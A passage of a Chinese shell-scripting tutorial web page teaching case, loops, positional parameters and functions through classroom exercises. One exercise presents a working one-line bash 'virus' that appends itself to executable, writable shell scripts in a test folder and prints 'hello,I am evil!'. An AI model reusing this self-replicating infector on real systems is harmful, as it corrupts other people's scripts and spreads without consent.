class="built_in">read</span> -p <span class="string">"请玩家取石子:"</span> w</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"我取 <span class="subst">$((($n2+1)</span>-<span class="variable">$w</span>)) 个石子"</span></span><br><span class="line">    q=$((<span class="variable">$q</span>-(<span class="variable">$n2</span>+<span class="number">1</span>)))</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">    [ <span class="variable">$q</span> -eq 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">"你输了@.@!"</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$k</span> -gt 0 ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"我先取 <span class="variable">$k</span> 个石子"</span></span><br><span class="line">    q=$((<span class="variable">$n1</span>-<span class="variable">$k</span>))</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"目前还剩下 <span class="variable">$q</span> 个石子"</span></span><br><span class="line">    HH</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    q=<span class="variable">$n1</span></span><br><span class="line">    HH</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="case-语法格式" class="article-heading"><a href="#case-语法格式" class="headerlink" title="case 语法格式"></a>case 语法格式<a class="article-anchor" href="#case-语法格式" aria-hidden="true"></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">case 取值 in</span><br><span class="line">取值 1)</span><br><span class="line">    CMD1 ;</span><br><span class="line">    cmd11;</span><br><span class="line">    cmd12;;</span><br><span class="line">取值 2)</span><br><span class="line">    CMD2 ;;</span><br><span class="line">取值 3)</span><br><span class="line">    CMD3 ;;</span><br><span class="line">*)</span><br><span class="line">    CMD4 ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
<p>* 代表除了以上所有的取值 , 做某一些操作</p>
<h4 id="课堂练习-3" class="article-heading"><a href="#课堂练习-3" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习-3" aria-hidden="true"></a></h4><ol>
<li>请问你是否喜欢shell脚本？ 如果你回答yes，则程序退出，否则永远会问你是否喜欢shell脚本？</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]# cat 1.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">read -p "请问你是否喜欢shell脚本？" an</span><br><span class="line">until [ $an = yes ]</span><br><span class="line">do</span><br><span class="line">case $an in</span><br><span class="line">yes)</span><br><span class="line">    exit;;</span><br><span class="line">*)</span><br><span class="line">    read -p "请问你是否喜欢shell脚本？" an;;</span><br><span class="line"></span><br><span class="line">esac</span><br><span class="line">done</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br><span class="line">[root@client0 ~]# bash 1.sh</span><br><span class="line">请问你是否喜欢shell脚本？no</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？lsdjflksd</span><br><span class="line">请问你是否喜欢shell脚本？iii</span><br><span class="line">请问你是否喜欢shell脚本？fuck you</span><br><span class="line">1.sh: line 4: [: too many arguments</span><br><span class="line">请问你是否喜欢shell脚本？...</span><br><span class="line">请问你是否喜欢shell脚本？^^^[[D</span><br><span class="line">请问你是否喜欢shell脚本？yes</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="continue-语法格式" class="article-heading"><a href="#continue-语法格式" class="headerlink" title="continue 语法格式"></a>continue 语法格式<a class="article-anchor" href="#continue-语法格式" aria-hidden="true"></a></h3><pre><code>continue 作用于循环语句中 代表跳出这个循环进入下个循环 .</code></pre><h4 id="课堂练习-4" class="article-heading"><a href="#课堂练习-4" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习-4" aria-hidden="true"></a></h4><ol start="2">
<li>要求输出100以下所有能够被7整除，但不能够被5整除的数字。（并在一行输出）</li>
</ol>
<h3 id="break-语法格式" class="article-heading"><a href="#break-语法格式" class="headerlink" title="break 语法格式"></a>break 语法格式<a class="article-anchor" href="#break-语法格式" aria-hidden="true"></a></h3><pre><code>break 作用于循环语句中 代表直接跳出该循环 .</code></pre><h4 id="课堂练习-5" class="article-heading"><a href="#课堂练习-5" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习-5" aria-hidden="true"></a></h4><ol start="3">
<li>要求找出系统中属于student用户的一个文件.</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat file.sh</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `find / -user student 2&gt;/dev/null`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line">    <span class="built_in">break</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="shift-语法格式" class="article-heading"><a href="#shift-语法格式" class="headerlink" title="shift 语法格式"></a>shift 语法格式<a class="article-anchor" href="#shift-语法格式" aria-hidden="true"></a></h3><pre><code>位置参数</code></pre><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">   $</span><span class="bash">1 代表的是输入的第一个参数</span></span><br><span class="line"><span class="meta">$</span><span class="bash">2 代表的是输入的第二个参数 ....</span></span><br><span class="line"><span class="meta">$</span><span class="bash">0 代表的是 bash 程序本身名</span></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="comment"># 代表的是参数的个数</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;10&#125; 超过的两位的</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;*&#125;或者<span class="variable">$&#123;@&#125;</span> 代表将所有位置参数</span></span><br><span class="line">shift 代表移走第一位位置参数 , 由后续的位置参数前移一位 .</span><br></pre></td></tr></table></figure>
<h4 id="课堂练习-6" class="article-heading"><a href="#课堂练习-6" class="headerlink" title="课堂练习"></a>课堂练习<a class="article-anchor" href="#课堂练习-6" aria-hidden="true"></a></h4><ol start="4">
<li>显示位置参数的值，以及可执行脚本名称，参数的总数</li>
</ol>
<h3 id="function-语法格式" class="article-heading"><a href="#function-语法格式" class="headerlink" title="function 语法格式"></a>function 语法格式<a class="article-anchor" href="#function-语法格式" aria-hidden="true"></a></h3><pre><code>functname ()
{
shell commands
}</code></pre><ul>
<li><p>函数的调用</p>
<ol>
<li>直接调用函数– 函数名</li>
<li>传入参数– 函数名 参数1 参数2 参数3</li>
<li>使用return返回函数结束状态</li>
</ol>
</li>
<li><p>函数中的局部变量和全局变量</p>
</li>
</ul>
<p>默认为全局变量，因此不同的函数不可以使用同一个变量；<br>如果要变成局部变量，需要使用local来修饰，那么不同的函数就不能访问到这个局部变量。</p>
<ul>
<li>函数返回值 return<br>可以使用return命令来设置返回值；</li>
</ul>
<p>例如 return 0</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#### 课堂练习</span></span><br><span class="line"></span><br><span class="line">5. 创建一个命令booboo，命令用法如下：</span><br><span class="line">booboo -t 30s     代表睡30s；即-t后跟时间</span><br><span class="line">booboo -l /tmp  代表显示某个目录下面的内容和属性以及目录本身的属性</span><br><span class="line">booboo -r /tmp/file 代表删除某个文件</span><br><span class="line">booboo --<span class="built_in">help</span>    代表帮助信息显示该命令的用法</span><br><span class="line"></span><br><span class="line">6. 输入你的出生日期，程序会告诉你距离你下一个生日还有几天？</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat booboo</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">    sleep <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIR ()</span><br><span class="line">&#123;</span><br><span class="line">    ls -l <span class="variable">$1</span></span><br><span class="line">    ls -ld <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RM ()</span><br><span class="line">&#123;</span><br><span class="line">    rm -rf <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-t)</span><br><span class="line">    SLEEP <span class="variable">$2</span>;;</span><br><span class="line">-l)</span><br><span class="line">    DIR <span class="variable">$2</span>;;</span><br><span class="line">-r)</span><br><span class="line">    RM <span class="variable">$2</span>;;</span><br><span class="line">--<span class="built_in">help</span>)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line">*)</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line">[root@client0 ~]<span class="comment"># ./booboo -t 3s</span></span><br></pre></td></tr></table></figure>
<hr>
<p>使用bash写一个脚本实现以下功能：</p>
<p>1) -r 查看系统发行版本<br>2) -k 查看系统内核版本<br>3) -d 查看系统磁盘信息<br>4) -u 查看当前系统用户<br>5) -t 查看系统运行时间<br>6) -s 查看selinux状态<br>7) -f 查看内存信息<br>8) -n 查看网络信息<br>9) -a 实现以上所有功能<br>10）–help 查看帮助</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">REL () &#123;</span><br><span class="line">cat /etc/redhat-release    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KER () &#123;</span><br><span class="line">uname -a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIS () &#123;</span><br><span class="line">df -h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USR () &#123;</span><br><span class="line">who</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UPT () &#123;</span><br><span class="line">uptime</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEL () &#123;</span><br><span class="line">getenforce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FER () &#123;</span><br><span class="line">free -m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NET () &#123;</span><br><span class="line">ifconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-r)</span><br><span class="line">    REL;;    </span><br><span class="line">-k)</span><br><span class="line">    KER;;</span><br><span class="line">-d)</span><br><span class="line">    DIS;;</span><br><span class="line">-u)</span><br><span class="line">    USR;;</span><br><span class="line">-t)</span><br><span class="line">    UPT;;</span><br><span class="line">-s)</span><br><span class="line">    SEL;;</span><br><span class="line">-f)    </span><br><span class="line">    FER;;</span><br><span class="line">-n)</span><br><span class="line">    NET;;</span><br><span class="line">-a)</span><br><span class="line">    REL;KER;DIS;USR;UPT;SEL;FER;NET;;</span><br><span class="line">--help)</span><br><span class="line">    echo "this is help"</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>
<hr>
<p>用shell脚本写一个病毒，要求如下：</p>
<ol>
<li>可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写；</li>
<li>执行感染后的bash shell脚本会输出”echo hello,I am evil!”</li>
<li>如果已经被感染，就不再感染</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></table></figure>
<hr>
<p>如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">        echo "now sleep"</span><br><span class="line">        sleep $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-s)</span><br><span class="line">        SLEEP $2;;</span><br><span class="line">*)</span><br><span class="line">        exit;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>







              </div>
              <footer class="article-footer">
                <time class="article-footer-updated" datetime="2020-10-13T11:33:32.516Z" itemprop="dateModified">上次更新：2020-10-13</time>
                <a href="/linux/index.html" class="article-footer-next" title="概览"><span>下一页</span><i class="fa fa-chevron-right"></i></a>
              </footer>
              
<section id="comments">
  <div id="disqus_thread"></div>
</section>
<script>
  var disqus_shortname = 'toberoot';
  var disqus_url = 'http://www.toberoot.com/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement.html';
  var disqus_title = "shell 脚本";
  var disqus_config = function(){
    this.language = 'zh';
  };
  (function(){
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = 'https://go.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>

            </div>
          </div>
          <aside id="article-toc" role="navigation">
            <div id="article-toc-inner">
              
<div id="carbonads">
<span>
<span class="carbon-wrap">
<a href="https://github.com/booboowei" class="carbon-img" target="_blank" rel="noopener sponsored external nofollow noreferrer">
    <img src="https://avatars2.githubusercontent.com/u/21328020?s=460&u=88cf6127c32932188f936d05636b7b0d36783ee1&v=4"
    alt="ads via Carbon" border="0" style="max-width: 130px;">
</a>
<a href="/about/" class="carbon-text" target="_blank" rel="noopener sponsored">除了自己的无知，我什么都不知道</a>
</span>
</span>

              <strong class="sidebar-title">目录</strong>
              <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%9D%A1%E4%BB%B6"><span class="toc-text">判断条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#if-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">if 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">for 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%80%BC%E8%8C%83%E5%9B%B4"><span class="toc-text">取值范围</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-text">命令行方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0-1"><span class="toc-text">课堂练习</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E9%A2%98"><span class="toc-text">拓展题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#while-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">while 语法格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#until-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">until 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0-2"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%99%9A%E8%87%AA%E4%B9%A0%E4%BD%9C%E4%B8%9A"><span class="toc-text">晚自习作业</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#case-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">case 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0-3"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#continue-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">continue 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0-4"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#break-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">break 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0-5"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shift-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">shift 语法格式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BE%E5%A0%82%E7%BB%83%E4%B9%A0-6"><span class="toc-text">课堂练习</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#function-%E8%AF%AD%E6%B3%95%E6%A0%BC%E5%BC%8F"><span class="toc-text">function 语法格式</span></a></li></ol>
              <a href="#" id="article-toc-top">回到顶部</a>
            </div>
          </aside>
        </div>
      </article>
      <aside id="sidebar" role="navigation">
  <div class="inner">
    <strong class="sidebar-title">开始使用</strong><a href="/linux/index.html" class="sidebar-link">概览</a><strong class="sidebar-title">Linux 基础</strong><a href="/linux/booboo_linux_base/index.html" class="sidebar-link">概览</a><a href="/linux/booboo_linux_base/00-linux_history.html" class="sidebar-link">Linux历史</a><a href="/linux/booboo_linux_base/01-Linux基础命令.html" class="sidebar-link">基础命令</a><a href="/linux/booboo_linux_base/02-Linux用户和组.html" class="sidebar-link">用户和组</a><a href="/linux/booboo_linux_base/03-Linux文件和目录.html" class="sidebar-link">文件和目录</a><a href="/linux/booboo_linux_base/04-Linux压缩打包.html" class="sidebar-link">压缩打包</a><a href="/linux/booboo_linux_base/05-Linux软件安装.html" class="sidebar-link">软件安装</a><a href="/linux/booboo_linux_base/06-Vim.html" class="sidebar-link">Vim</a><a href="/linux/booboo_linux_base/07-Bash简介.html" class="sidebar-link">Bash简介</a><a href="/linux/booboo_linux_base/08-日志和计划任务.html" class="sidebar-link">日志和计划任务</a><a href="/linux/booboo_linux_base/09-Linux文件系统和磁盘管理.html" class="sidebar-link">文件系统</a><a href="/linux/booboo_linux_base/10-Linux开机启动流程.html" class="sidebar-link">开机启动流程</a><a href="/linux/booboo_linux_base/11-Linux内核.html" class="sidebar-link">Linux内核</a><a href="/linux/booboo_linux_base/12-SELINUX.html" class="sidebar-link">SELINUX</a><a href="/linux/booboo_linux_base/13-进程管理.html" class="sidebar-link">进程管理</a><strong class="sidebar-title">Linux 简易服务</strong><a href="/linux/booboo_easy_service/index.html" class="sidebar-link">概览</a><a href="/linux/booboo_easy_service/00_linux_classroom_env.html" class="sidebar-link">课程环境</a><a href="/linux/booboo_easy_service/01_dns.html" class="sidebar-link">DNS</a><a href="/linux/booboo_easy_service/02_ftp.html" class="sidebar-link">FTP</a><a href="/linux/booboo_easy_service/03_nfs.html" class="sidebar-link">NFS</a><a href="/linux/booboo_easy_service/04_samba.html" class="sidebar-link">SAMBA</a><a href="/linux/booboo_easy_service/05_apache.html" class="sidebar-link">APACHE</a><a href="/linux/booboo_easy_service/06_ntp_chrony.html" class="sidebar-link">时间同步服务</a><a href="/linux/booboo_easy_service/07_iptables_firewalld.html" class="sidebar-link">防火墙</a><strong class="sidebar-title">Shell Scripts</strong><a href="/linux/booboo_bash_shell_scripts/index.html" class="sidebar-link">概览</a><a href="/linux/booboo_bash_shell_scripts/00_shell_variables.html" class="sidebar-link">变量简介</a><a href="/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement.html" class="sidebar-link">流程控制</a><a href="/linux/booboo_bash_shell_scripts/02_shell_regular_expression.html" class="sidebar-link">正则表达式</a><a href="/linux/booboo_bash_shell_scripts/03_shell_sed_awk.html" class="sidebar-link">Sed_AWK</a><a href="/linux/booboo_bash_shell_scripts/04_shell_brackets.html" class="sidebar-link">各种括号的作用</a><a href="/linux/booboo_bash_shell_scripts/shell上机.html" class="sidebar-link">上机考试</a><a href="/linux/booboo_bash_shell_scripts/shell笔试.html" class="sidebar-link">笔试题目</a><strong class="sidebar-title">Docker</strong><a href="/linux/docker/install_docker.html" class="sidebar-link">安装Docker</a><a href="/linux/docker/zipkin.html" class="sidebar-link">安装Zipkin</a><strong class="sidebar-title">Ex-Tools</strong><a href="/linux/excellent_tools/index.html" class="sidebar-link">概览</a><a href="/linux/excellent_tools/systemd.html" class="sidebar-link">systemd</a><a href="/linux/excellent_tools/supervisor.html" class="sidebar-link">supervisor</a><a href="/linux/excellent_tools/prometheus.html" class="sidebar-link">prometheus</a><strong class="sidebar-title">LAMP</strong><a href="/linux/lamp/index.html" class="sidebar-link">概览</a><a href="/linux/lamp/phpems.html" class="sidebar-link">考试系统PHPEMS</a>
  </div>
</aside>
    </div>
  </div>
</div>

    <footer id="footer" class="wrapper">
  <div class="inner">
    <div id="footer-copyright">
      &copy; 2020 <a href="https://github.com/hexojs/hexo/graphs/contributors" rel="external nofollow noreferrer" target="_blank">魏亚萍</a><br>
      Documentation licensed under <a href="https://choosealicense.com/licenses/agpl-3.0/" rel="external nofollow noreferrer" target="_blank">GNU AGPLv3</a><br>
      备案号：沪ICP备2020026043号
    </div>
    <div id="footer-links">
      <a href="https://github.com/BoobooWei" rel="external nofollow noreferrer" class="footer-link" target="_blank"><i class="fa fa-github-alt"></i></a>
      <a target="_blank" href="http://exam.toberoot.com/" rel="external nofollow noreferrer noopener">在线测评系统</a><
      <a href="https://www.huangjingxue.com/" rel="external nofollow noreferrer" target="_blank">衾袭</a><
      <a href="https://husky-wu.github.io/" rel="external nofollow noreferrer" target="_blank">明夋</a><
      <a href="https://footman-ljn.github.io/" rel="external nofollow noreferrer" target="_blank">伊斯</a>
    </div>
  </div>
  <br>
  <div class="inner">
  </div>

</footer>

  </div>
  <div id="mobile-nav-dimmer"></div>
  <nav id="mobile-nav">
  <div id="mobile-nav-inner">
    <ul id="mobile-nav-list">
      <a href="/api/" class="mobile-nav-link">MySQL8.0</a><a href="/linux/" class="mobile-nav-link">Linux</a><a href="/mysql/" class="mobile-nav-link">MySQL</a><a href="/oracle/" class="mobile-nav-link">Oracle</a><a href="/python/" class="mobile-nav-link">Python</a><a href="/git/" class="mobile-nav-link">Git</a><a href="/tick/" class="mobile-nav-link">TICK</a><a href="/mse/" class="mobile-nav-link">MSE</a><a href="/aliyun/" class="mobile-nav-link">AliYun</a><a href="/news/" class="mobile-nav-link">News</a>
      <li class="mobile-nav-item">
        <a href="https://github.com/BoobooWei" class="mobile-nav-link" rel="external" target="_blank">GitHub</a>
      </li>
    </ul>
    
      <strong class="mobile-nav-title">开始使用</strong><a href="/linux/index.html" class="mobile-nav-link">概览</a><strong class="mobile-nav-title">Linux 基础</strong><a href="/linux/booboo_linux_base/index.html" class="mobile-nav-link">概览</a><a href="/linux/booboo_linux_base/00-linux_history.html" class="mobile-nav-link">Linux历史</a><a href="/linux/booboo_linux_base/01-Linux基础命令.html" class="mobile-nav-link">基础命令</a><a href="/linux/booboo_linux_base/02-Linux用户和组.html" class="mobile-nav-link">用户和组</a><a href="/linux/booboo_linux_base/03-Linux文件和目录.html" class="mobile-nav-link">文件和目录</a><a href="/linux/booboo_linux_base/04-Linux压缩打包.html" class="mobile-nav-link">压缩打包</a><a href="/linux/booboo_linux_base/05-Linux软件安装.html" class="mobile-nav-link">软件安装</a><a href="/linux/booboo_linux_base/06-Vim.html" class="mobile-nav-link">Vim</a><a href="/linux/booboo_linux_base/07-Bash简介.html" class="mobile-nav-link">Bash简介</a><a href="/linux/booboo_linux_base/08-日志和计划任务.html" class="mobile-nav-link">日志和计划任务</a><a href="/linux/booboo_linux_base/09-Linux文件系统和磁盘管理.html" class="mobile-nav-link">文件系统</a><a href="/linux/booboo_linux_base/10-Linux开机启动流程.html" class="mobile-nav-link">开机启动流程</a><a href="/linux/booboo_linux_base/11-Linux内核.html" class="mobile-nav-link">Linux内核</a><a href="/linux/booboo_linux_base/12-SELINUX.html" class="mobile-nav-link">SELINUX</a><a href="/linux/booboo_linux_base/13-进程管理.html" class="mobile-nav-link">进程管理</a><strong class="mobile-nav-title">Linux 简易服务</strong><a href="/linux/booboo_easy_service/index.html" class="mobile-nav-link">概览</a><a href="/linux/booboo_easy_service/00_linux_classroom_env.html" class="mobile-nav-link">课程环境</a><a href="/linux/booboo_easy_service/01_dns.html" class="mobile-nav-link">DNS</a><a href="/linux/booboo_easy_service/02_ftp.html" class="mobile-nav-link">FTP</a><a href="/linux/booboo_easy_service/03_nfs.html" class="mobile-nav-link">NFS</a><a href="/linux/booboo_easy_service/04_samba.html" class="mobile-nav-link">SAMBA</a><a href="/linux/booboo_easy_service/05_apache.html" class="mobile-nav-link">APACHE</a><a href="/linux/booboo_easy_service/06_ntp_chrony.html" class="mobile-nav-link">时间同步服务</a><a href="/linux/booboo_easy_service/07_iptables_firewalld.html" class="mobile-nav-link">防火墙</a><strong class="mobile-nav-title">Shell Scripts</strong><a href="/linux/booboo_bash_shell_scripts/index.html" class="mobile-nav-link">概览</a><a href="/linux/booboo_bash_shell_scripts/00_shell_variables.html" class="mobile-nav-link">变量简介</a><a href="/linux/booboo_bash_shell_scripts/01_shell_flow_control_statement.html" class="mobile-nav-link">流程控制</a><a href="/linux/booboo_bash_shell_scripts/02_shell_regular_expression.html" class="mobile-nav-link">正则表达式</a><a href="/linux/booboo_bash_shell_scripts/03_shell_sed_awk.html" class="mobile-nav-link">Sed_AWK</a><a href="/linux/booboo_bash_shell_scripts/04_shell_brackets.html" class="mobile-nav-link">各种括号的作用</a><a href="/linux/booboo_bash_shell_scripts/shell上机.html" class="mobile-nav-link">上机考试</a><a href="/linux/booboo_bash_shell_scripts/shell笔试.html" class="mobile-nav-link">笔试题目</a><strong class="mobile-nav-title">Docker</strong><a href="/linux/docker/install_docker.html" class="mobile-nav-link">安装Docker</a><a href="/linux/docker/zipkin.html" class="mobile-nav-link">安装Zipkin</a><strong class="mobile-nav-title">Ex-Tools</strong><a href="/linux/excellent_tools/index.html" class="mobile-nav-link">概览</a><a href="/linux/excellent_tools/systemd.html" class="mobile-nav-link">systemd</a><a href="/linux/excellent_tools/supervisor.html" class="mobile-nav-link">supervisor</a><a href="/linux/excellent_tools/prometheus.html" class="mobile-nav-link">prometheus</a><strong class="mobile-nav-title">LAMP</strong><a href="/linux/lamp/index.html" class="mobile-nav-link">概览</a><a href="/linux/lamp/phpems.html" class="mobile-nav-link">考试系统PHPEMS</a>
    
  </div>
  <div id="mobile-lang-select-wrap">
    <span id="mobile-lang-select-label"><i class="fa fa-globe"></i><span>简体中文</span></span>
    <select id="mobile-lang-select" data-canonical="">
      
        <option value="zh-cn" selected>简体中文</option>
      
    </select>
  </div>
</nav>
  <!-- Scripts -->
<!-- Cookie -->
<script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script>
<!-- build:js build/js/main.js -->

<script src="/js/lang_select.js"></script>


<script src="/js/toc.js"></script>


<script src="/js/mobile_nav.js"></script>

<!-- endbuild -->

<!-- Algolia -->

<!-- at the end of the BODY -->
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/docsearch.js@2/dist/cdn/docsearch.min.js"></script>
<script type="text/javascript">
document.getElementById('search-input-wrap').classList.add('on');
docsearch({
    apiKey: 'ad652bf20bcd81434ad119c8cf34722e',
    indexName: 'toberoot',
    inputSelector: '#search-input'
});
</script>

<!--   backup
<script type="text/javascript" src="https://cdn.jsdelivr.net/docsearch.js/1/docsearch.min.js"></script>
<script type="text/javascript">
document.getElementById('search-input-wrap').classList.add('on');
docsearch({
  apiKey: 'ad652bf20bcd81434ad119c8cf34722e',
  indexName: 'toberoot',
  inputSelector: '#search-input'
});
</script>
-->

<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.slim.min.js"
    integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n"
    crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
    integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo"
    crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"
    integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6"
    crossorigin="anonymous"></script>
<!-- Bootstrap JS -->



</body>
</html>